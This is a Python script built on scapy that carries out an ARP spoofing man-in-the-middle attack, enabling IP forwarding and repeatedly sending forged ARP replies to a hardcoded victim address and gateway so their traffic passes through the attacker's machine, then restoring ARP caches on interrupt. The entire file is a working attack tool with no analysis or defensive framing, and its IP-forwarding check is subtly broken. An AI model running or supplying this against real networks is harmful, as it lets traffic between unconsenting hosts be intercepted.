from scapy.all import *
import argparse
import sys
import os
import time


def enable_ip_routing(verbose=True):
    #enabling ip routing is necessary to form the routing table with target address as next hop address.
    if verbose:
        print("Please wait while IP routing is currently being enabled")

       #Check the ip_forward settings in files. It contains 0 or 1.
        #1-Enabled. 0-Disabled
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as f:
            if f.read() == 1:
                print("IP Routing is already enabled.")
                return
            
        with open(file_path, "w") as f:
            print(1, file=f)
            #write 1 to the file
    if verbose:
        print("IP routing is successfully enabled")

    
        
def get_mac_address(ip):
    #queries the mac address using the ip of other device.
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

    
                                                                
def spoof(target_ip, host_ip, verbose=True):
    #get te mac address using ip address.
    target_mac = get_mac_address(target_ip)
    print("MAC address of ",target_ip," : ",target_mac)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at') #pdst-target protocal address. hwdst-destination hardware address. psrc= Sender protocol address.
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of our system (attacker)
        self_mac = ARP().hwsrc
        print("-- Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

        

def restore_to_old_state(target_ip, host_ip, verbose=True):
    #Restore the the arp cache of victims to old state to bring back the normal functioning of the network.
    target_mac = get_mac_address(target_ip)
    host_mac = get_mac_address(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

        

if __name__ == "__main__":
    # victim ip address
    target = "192.168.253.147"
    # gateway ip address
    host = "192.168.253.97"
   
    verbose = True
    # enable ip forwarding
    enable_ip_routing()
    try:
        while True:
            #Tell target that I am the host.
            spoof(target, host, verbose)

            #Tell the host that I am the victim.
            spoof(host, target, verbose)       
            time.sleep(1)
    except KeyboardInterrupt:
        #Press ctrl+C to stop spoofing and bring back the normal functioning of the network.
        print("--++-- Detected CTRL+C ! restoring the network, please wait...")
        restore_to_old_state(target, host)
        restore_to_old_state(host, target)




